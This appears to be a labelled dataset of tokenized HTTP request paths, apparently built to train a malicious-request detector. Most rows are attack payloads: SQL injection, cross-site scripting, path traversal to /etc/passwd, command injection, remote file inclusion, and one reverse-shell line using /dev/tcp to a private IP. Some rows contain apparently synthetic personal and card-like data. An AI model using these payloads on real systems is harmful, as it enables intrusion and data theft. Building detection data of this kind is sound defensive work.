sentences 	 labels
/ cacti / usrdetails . php ? sgnuptype = csaleid < script > nessus <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = -1212 %  '  )  or make_set ( 7588 = 2306 , 2306 )  and  (  '  %  '  =  '  \r\n\r\n 	 1
/ recordings / index . php ? gadget = glossary & action = viewterm & term =  < script > alert (  ' jaws_xss . nasl '  )  ;  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  where 6671 = 6671 or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  --  \r\n\r\n 	 1
/ examples / jsp / error / embed / day . php ? path =  / etc / passwd \ x00  \r\n\r\n 	 1
/ help . php ? q =  "  \ x0duname  > q87848513  #  \r\n\r\n 	 1
/ string / strings / parameters = ( select  ( case when  ( 3950 = 2747 )  then 1 else 1 /  ( select 0 )  end )  )  \r\n\r\n 	 1
/ main . php ? stuff =  " ver \ x0b > q36113668 & rem \ x0b  \r\n\r\n 	 1
/ string / modo = insertar & precio = 6857 & b1 = confirmar /  \r\n\r\n 	 1
/ string / modo = entrar & login = heunis & pwd =  '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & remember = on & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  --  wynp  \r\n\r\n 	 1
/ search . php ? zoom_query =  < script > alert (  \  " hello \  "  )  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = "  ;  str =  $  ( echo wbdhxy )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  #  \r\n\r\n 	 1
/ string / modo = registro & login = ning & password = graciosamente & nombre = roco + libertad & apellidos = oviol + de + la + quintana & email = tchoukova @ sgi-sl . is & dni = 16822336k & direccion = urbanizacion + palmeras ,  + s / n ,  +  & ciudad = mo + ntgai & cp = 17723 & provincia = segovia & ntc = 1507392936285379 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = "  ;  str =  $  ( echo vpbzfr )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  \r\n\r\n 	 1
/ string / str =  $  ( echo gjangu )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \r\n\r\n 	 1
/ string / strings / parameters = < button onclick = popup = 1 ;  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  (  ' qvqf '  =  ' qvqf  \r\n\r\n 	 1
/ javascript / signon . exe  \r\n\r\n 	 1
/ string / strings / parameters = '  |  | echo $ ifszfqbbs $  (  ( 42 + 5 )  )  $  ( echo $ ifszfqbbs ) zfqbbs /  /  \r\n\r\n 	 1
/  /  <  / p >  < body >  < script src = http :  /  / www . example . com / test ? rnd = q94793674 >  <  / script >  < p >  \r\n\r\n 	 1
/ help . php ? q =  '  & rm q67988136  #  \r\n\r\n 	 1
/ string / strings / parameters = -7707 '  )  )  union all select 3172 #  \r\n\r\n 	 1
/ ju0u7kfo . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = -2610 %  "  "  )  union all select 7779 , 7779 , 7779 , 7779 , 7779 --  \r\n\r\n 	 1
/ examples / jsp / jsp2 / el / index . php ? chemin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc  \r\n\r\n 	 1
/ top . php ? stuff =  " sleep 11  #  \r\n\r\n 	 1
/ subscriptions . tar . bz2  \r\n\r\n 	 1
/ javascript / 4 . exe  \r\n\r\n 	 1
/ ap58k3ci . jsp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = x '  and email is null ;   --  \r\n\r\n 	 1
/ string / strings / parameters = -3137 '  |  |  ( select  ' btif '  where 1718 = 1718 union all select 1718 , 1718 , 1718 , 1718 , 1718 , 1718 , 1718 , 1718 , 1718 #  \r\n\r\n 	 1
/ top . php ? stuff =  "  ; uname  > q17551646  #  \r\n\r\n 	 1
/ string / strings / parameters = -4304 '  where 1005 = 1005 union all select 1005 , 1005 #  \r\n\r\n 	 1
/ string / modo = insertar & precio = 2445 & b1 = confirmar /  \r\n\r\n 	 1
/ dslpwt15 . cfm ?  < script > document . cookie =  " testtkio = 5454 ;  "  <  / script >  \r\n\r\n 	 1
/  ? mod = read & id =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ cgi-bin / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1332008322 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00  \r\n\r\n 	 1
/ string / strings / parameters = '  ; echo hpsgqk $  (  ( 19 + 98 )  )  $  ( echo hpsgqk ) hpsgqk '  \r\n\r\n 	 1
/ oh that ' s tight 4 /  \r\n\r\n 	 1
/ d7ktpmcq . php3 ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = -5160 '  )  union all select 8067 , 8067 , 8067 , 8067 , 8067 , 8067 , 8067 --  \r\n\r\n 	 1
/ string / strings / parameters = '  ;  str =  $  ( echo asbpas )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  \r\n\r\n 	 1
/ create_file . php ? target = xxpathxx ?  \r\n\r\n 	 1
/ examples / jsp / jsp2 / el / faq . php ? action =  & type = view & s =  & id = -1 '  union select 0 , 1687881655 , 0 , 0 , 0 , 0 , 0 --  \r\n\r\n 	 1
/ gy23xnjq . mscgi ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = < div id =  " 129 "  >  < svg >  \r\n\r\n 	 1
/ string / strings / parameters = -9847 %  '  )  )  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  (  (  '  %  '  =  '  \r\n\r\n 	 1
/ string / modo = registro & login = arco & password = b74rera & nombre = agueda & apellidos = sauri + sanaspleda & email =   & dni = 57154114b & direccion = calle + medellin + 188 ,  + 3e & ciudad = aana & cp = 26360 & provincia = cceres & ntc = 6165671894107883 & b1 = registrar  \r\n\r\n 	 1
/ examples / jsp / error / forum . php ? do = viewtopic & cat = 1 & topic = 1 & page = 1 ?  < script > foo <  / script  \r\n\r\n 	 1
/ cmsimple2_7 / cmsimple / cms . php ? pth [  ' file '  ]  [  ' config '  ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ?  ?  \r\n\r\n 	 1
/ iktok2bw . fts ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ help . php ? q =  " ping , -w , 11000 , -n , 1 , 1 . 2 . 3 . 4 & rem ,  \r\n\r\n 	 1
/ 7uz3ok60 . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = javascript : alert ( 123 )  \r\n\r\n 	 1
/ examples / jsp / sessions / mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ javascript / c . exe  \r\n\r\n 	 1
/ apavxugx . asp ?  < meta http-equiv = set-cookie content =  " testdnbh = 5237 "  >  \r\n\r\n 	 1
/ index2 . php ? content = xxpathxx  \r\n\r\n 	 1
/ projects / 1 / repository / annotate ? rev =  ` 0 <  & 97- ; exec 97 <  >  / dev / tcp / 192 . 168 . 202 . 96 / 21625 ; sh  <  & 97  >  & 97 2 >  & 97 `  \r\n\r\n 	 1
/ string / strings / parameters = "   str =  $  ( echo psdlxw )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 1
/ string / strings / parameters = '  echo dhrzfk $  (  ( 82 + 16 )  )  $  ( echo dhrzfk ) dhrzfk '  \r\n\r\n 	 1
/ 1qwv2p5p . jsp ?  < script > document . cookie =  " testvqcy = 252 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = -4219 '  or 2724 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  as mwcs where 2544 = 2544 and exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8190 = 8190 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  --  \r\n\r\n 	 1
/ string / strings / parameters = -3998 '  )  )  or 3038 = 3038  \r\n\r\n 	 1
/ examples / jsp / error / index . php ? p =  ' nessus  \r\n\r\n 	 1
/ string / id = 3 & nombre = jamn + ibrico & precio = any ?   set-cookie :  + tamper = 1041264011025374727   & cantidad = 66 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ string / strings / parameters = "  |  | echo $ ifszcctfb $  (  ( 82 + 55 )  )  $  ( echo $ ifszcctfb ) zcctfb /  /  \r\n\r\n 	 1
/ string / id =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  \r\n\r\n 	 1
/ string / strings / parameters = < svg >  < style >  & lt ; img / src = x onerror = alert ( 1 )  /  /   <  / b >  \r\n\r\n 	 1
/ cgi-perl / c32web . exe / getimage ? imagename = customeremail . txt \ x00 . pdf  \r\n\r\n 	 1
/ string / strings / parameters = $  { shell_exec ( print (  ` echo vekgiy echo  $  (  ( 15 + 47 )  )  echo vekgiy echo vekgiy `  )  ;  .  ' vekgiy  \r\n\r\n 	 1
/ ows-bin / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ top . php ? stuff =  "  & del q51692947 & rem  \r\n\r\n 	 1
/ string / modo = registro & login = gaye & password = kantiana & nombre = fructuoso & apellidos = rodrigo + ambrs & email = bloom @ ajuntamentbcn2-0 . sz & dni = 96068417q & direccion = c /  + juan + sebastian + elcano + 178 +  & ciudad = toba & cp = 17741 & provincia = lleida & ntc = any ?  set-cookie :  + tamper = 5765205567234876235 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = "  < html xmlns : xss >  <  ? import namespace =  "  " xss "  "  implementation =  "  " http :  /  / ha . ckers . org / xss . htc "  "  >  < xss : xss > xss <  / xss : xss >  <  / html >  "  \r\n\r\n 	 1
/ 7o5qp766 . nsf ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ javascript / ssn . exe  \r\n\r\n 	 1
/ string / modo = entrar & login = info-man5 '  + and +  ' 1 '  =  ' 1 & pwd = franqueable & remember = on & b1 = entrar  \r\n\r\n 	 1
/ top . php ? stuff =  "  & rm , q96325278 & rem ,  \r\n\r\n 	 1
/ cgi-local / fileseek2 . cgi ? foot =  & head =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd  \r\n\r\n 	 1
/ string / strings / parameters = <  / stylesheet >  /  /  [  "  '  `  --  >  ]  ]  >  ]  <  / div >  \r\n\r\n 	 1
/ x2gyorli . dll ?  < script > document . cookie =  " testwhac = 3130 ;  "  <  / script >  \r\n\r\n 	 1
/ examples / jsp / sessions / wiki / edit . php ? page = sandbox & suck_url =  .  .  / kernel / config_inc . php & do_suck = h  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  ; begin dbms_lock . sleep ( 5 )  ;  end  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  where 9006 = 9006 union all select null , null , null , null , null , null --  \r\n\r\n 	 1
/ string / strings / parameters = "  ; echo qbisfh $  (  ( 85 + 18 )  )  $  ( echo qbisfh ) qbisfh |  \r\n\r\n 	 1
/ cgi-bin / bsguest . cgi ? email = x ; ls  \r\n\r\n 	 1
/ xsqln7eb . cfc ?  < meta http-equiv = set-cookie content =  " testpcbb = 9254 "  >  \r\n\r\n 	 1
/ string / modo = registro & login = ofilia & password = santurrn & nombre = lauran & apellidos = tonk + carrizales & email = engel @ longboarders . cu & dni = 17b088362y & direccion = plza .  + juan + zorrilla ,  + 107 + 9 ? f & ciudad = bruc ,  + el & cp = 28522 & provincia = granada & ntc = 1816581279872417 & b1 = registrar  \r\n\r\n 	 1
/ string / modo = insertar & precio = 6987 '  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & b1 = pasar + por + caja  \r\n\r\n 	 1
/ string / strings / parameters = "   str =  $  ( echo hkgdxh )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 1
/ string / modo = entrar & login = o . murchu & pwd =  . perrera & remember = onbob @  < script > alert ( paros )  <  / script >  . parosproxy . org & b1 = entrar  \r\n\r\n 	 1
/ jw64yq8u . jspa ?  < meta http-equiv = set-cookie content =  " testylfu = 1313 "  >  \r\n\r\n 	 1
/ script / param / param . inc . php ? path_inc = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  \r\n\r\n 	 1
/ examples / jsp / jsp2 / el / main . php ? g2_view = zipcart . download & g2_file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ cgi-sys / query ? mss =  .  .  / config  \r\n\r\n 	 1
/ string / strings / parameters = -7786 '  )  )  or 9323 = 9323 #  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  (  ' rfln '  =  ' rfln  \r\n\r\n 	 1
/ string / str =  $  ( echo grgshx )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 1
/ index . php ? func = manager & module = ew_filemanager & pathext =  .  .  /  .  .  /  .  .  / etc & type = admin  \r\n\r\n 	 1
/ admini / admin . php ? inc = xxpathxx ?  \r\n\r\n 	 1
/ manager / lang / index . php ? file =  / etc / passwd  \r\n\r\n 	 1
/ a0imiuf1 . cfm ?  < script > document . cookie =  " testxqrn = 4654 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  )  union all select null , null , null #  \r\n\r\n 	 1
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 00 + 10 + 00 + 00 + 00 + 20 + 00 + 00 + 00 + 00 + 40 + 00 + 00 + 10 + 00 + 00 + 00 + 02 + 00 + 00 + 04 + 00 + 00 + 00 + 00 +  +  >  > ctdn  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  |  |  ( select  ' zzkx '  where 3270 = 3270 and 2006 = 2006  \r\n\r\n 	 1
/ functions . php ? s [ phppath ]  = xxpathxx  \r\n\r\n 	 1
/ string / modo = entrar & login =  * shel * egey7 & pwd = exp8a1 ! a6a & remember = on & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = & echo $ ifsjqvamd $  (  ( 56 + 15 )  )  $  ( echo $ ifsjqvamd ) jqvamd "  \r\n\r\n 	 1
/ string / strings / parameters = "   str =  $  ( echo wxkpiw )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 1
/ de3v2dd9 . asp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = declare  @ q nvarchar  ( 4000 )  select  @ q  =  \r\n\r\n 	 1
/ en-us / odzk29aa . kspx ?  < script > document . cookie =  " testtfvh = 2141 ;  "  <  / script >  \r\n\r\n 	 1
/ shoutbox . php ? conf =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ string / strings / parameters = &  & echo $ ifskgiczj $  (  ( 97 + 57 )  )  $  ( echo $ ifskgiczj ) kgiczj '  \r\n\r\n 	 1
/ string / modo =  +  & login = michaud & password = 41g4i1a487ad1 & nombre = enoch & apellidos = demuner & email = stevensen7 @ deltamarina . cat & dni = 50873406m & direccion = emigrante + 50 ,  +  & ciudad = monroyo & cp = 30191 & provincia = guadalajara & ntc = 8474012494914092 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 where 7642 = 7642 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  --  \r\n\r\n 	 1
/ string / strings / parameters = |   [  6 -ne  $  ( echo pfmsxe  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  \r\n\r\n 	 1
/ string / strings / parameters = -2568 "  "  )  or  ( 8459 = 8459 )  * 4906 and  (  "  " exyw "  "  =  "  " exyw  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  as hlbq where 2347 = 2347 and 6055 = ctxsys . drithsx . sn ( 6055 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  --  \r\n\r\n 	 1
/ string / modo = entrar & login = breglec & pwd = alegrn & remember = on /  & b1 = entrar  \r\n\r\n 	 1
/ examples / servlets / servlet / index . php ? act = arcade & do = stats & gameid = 1 '  \r\n\r\n 	 1
/ examples / jsp / jsp2 / el / index . php ? mod_id = 2 & kb_ask =  <  / textarea >  < script > alert (  " cerberus_support_center_mult_flaws . nasl "  )  <  / script >  \r\n\r\n 	 1
/ search . php ? config [  " sipssys "  ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  \r\n\r\n 	 1
/ string / strings / parameters = < audio src = 1 onerror = alert ( 1 )  >  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fegqzm )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  \r\n\r\n 	 1
/ string / strings / parameters = 1 and elt ( 1210 = 1210 , sleep ( 5 )  )  #  macc  \r\n\r\n 	 1
/ examples / jsp / colors / adodb-perf-module . inc . php ? last_module = zzz_adoconnection {  } system ( id )  ; class zzz_adoconnection {  }  /  /  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo jsqhho )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  |  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  as qkkm where 8461 = 8461 ; select  ( case when  ( 9030 = 9185 )  then 9030 else 9030 *  ( select 9030 from information_schema . character_sets )  end )  #  \r\n\r\n 	 1
/ string / strings / parameters = 1  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  #  ujdg  \r\n\r\n 	 1
/ top . php ? stuff =  "  \ x0duname \ x09 > q29585118 \ x09 #  \r\n\r\n 	 1
/ top . php ? stuff =  & ver  > q16387238 & rem  \r\n\r\n 	 1
/ string / strings / parameters = |  | echo eumdza $  (  ( 75 + 60 )  )  $  ( echo eumdza ) eumdza \  \r\n\r\n 	 1
/ modules / 4nalbum / public / displaycategory . php ? basepath = xxpathxx  \r\n\r\n 	 1
/ edit . jsp ? page = user & editor =  .  .  /  .  .  /  .  .  / install  \r\n\r\n 	 1
/ qczkquis . mscgi ?  < meta http-equiv = set-cookie content =  " testkwlg = 5591 "  >  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo gzngde )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  &  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  as yekp where 3049 = 3049 and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  \r\n\r\n 	 1
/ string / strings / parameters = -8809 '  |  |  ( select  ' hyzr '  where 5694 = 5694 union all select 5694 --  \r\n\r\n 	 1
/ string / strings / parameters = "  ;  str =  $  ( echo avkifd )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  #  \r\n\r\n 	 1
/ scripts / forum . php3 ? id_article = 1 & id_forum = -1 /  *  *  / union /  *  *  / select 438328228 --  \r\n\r\n 	 1
/ phpmyadmin / phpmyadmin . css . php ? collation_connection = utf8_general_ci & convcharset = utf-8 & js_frame = right & lang = en-utf-8 & nocache = 3830415403 & token = 1 '  \r\n\r\n 	 1
/ string / strings / parameters = -7482 %  "  "  )  )  or 1570 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ string / strings / parameters = '  +  ( select 999999 )  +  '  \r\n\r\n 	 1
/ fo564rei . nsf ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ top . php ? stuff =  \ x0duname \ x09 > q27119174 \ x09 #  \r\n\r\n 	 1
/ main . php ? stuff =  "  ; rm q85142671  #  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / index . php ? configfile =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ string / strings / parameters = |  | echo yllpsr $  (  ( 30 + 99 )  )  $  ( echo yllpsr ) yllpsr /  /  \r\n\r\n 	 1
/ top . php ? stuff =  '  & uname \ x09 > q76524279 \ x09 #  \r\n\r\n 	 1
/ hipkz026 . do ?  < meta http-equiv = set-cookie content =  " testyrbs = 2855 "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  where 8734 = 8734 procedure analyse ( extractvalue ( 9627 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x4b774c75 )  )  )  )  )  , 1 )  #  \r\n\r\n 	 1
/ h4bi26jd . kspx ?  < meta http-equiv = set-cookie content =  " testhrzx = 1150 "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  ; if ( 7899 = 7899 )  select 7899 else drop function zbbp --  \r\n\r\n 	 1
/ cgi-perl / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ top . php ? stuff =  " sleep \ x098 \ x09 #  \r\n\r\n 	 1
/ string / modo = insertar ?  & precio = 909 & b1 = pasar + por + caja  \r\n\r\n 	 1
/ string / strings / parameters = & echo noksur $  (  ( 8 + 35 )  )  $  ( echo noksur ) noksur \  \  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  as ynuw where 9138 = 9138 ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual --  \r\n\r\n 	 1
/ main . php ? stuff =  " ver & rem ,  \r\n\r\n 	 1
/ examples / jsp / colors / directory . php ? dir =  ; cat  / etc / passwd  \r\n\r\n 	 1
/ xsqln7eb . jsp ?  < script > document . cookie =  " testpcbb = 9254 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 where 3357 = 3357 and  ( 9492 = 4334 )  * 4334 --  \r\n\r\n 	 1
/ 9ko6m4c8 . asp ?  < meta http-equiv = set-cookie content =  " testylik = 3403 "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  where 9461 = 9461 union all select null , null , null , null , null , null , null , null , null #  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select zwsr where 6567 = 6567 ; select pg_sleep ( 5 )  )  +  '  \r\n\r\n 	 1
/ string / strings / parameters = 1 where 7425 = 7425 rlike  ( select  ( case when  ( 4056 = 3196 )  then 1 else 0x28 end )  )  --  \r\n\r\n 	 1
/ string / id =   & nombre = queso + manchego & precio = 39 & cantidad = 24 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ string / strings / parameters = &  # 060  \r\n\r\n 	 1
/ examples / jsp / colors / index . php ? album =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = echo $ ifsqyfurg $  (  ( 23 + 53 )  )  $  ( echo $ ifsqyfurg ) qyfurg "  \r\n\r\n 	 1
/ eei78ore . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  and make_set ( 6488 = 5525 , 5525 )  \r\n\r\n 	 1
/ 0x2e0x2e / 0x2e0x2e / 0x2e0x2e / 0x2e0x2e / 0x2e0x2e / 0x2e0x2e / 0x2e0x2e /  { file }  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  )  )  procedure analyse ( extractvalue ( 9627 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x4b774c75 )  )  )  )  )  , 1 )  #  \r\n\r\n 	 1
/ string / modo = entrar & login = junibob @  < script > alert ( paros )  <  / script >  . parosproxy . org & pwd = 8escr1bir & remember = on & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = '  echo qkghpd $  (  ( 17 + 97 )  )  $  ( echo qkghpd ) qkghpd '  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  and  ( 8898 = 8898  \r\n\r\n 	 1
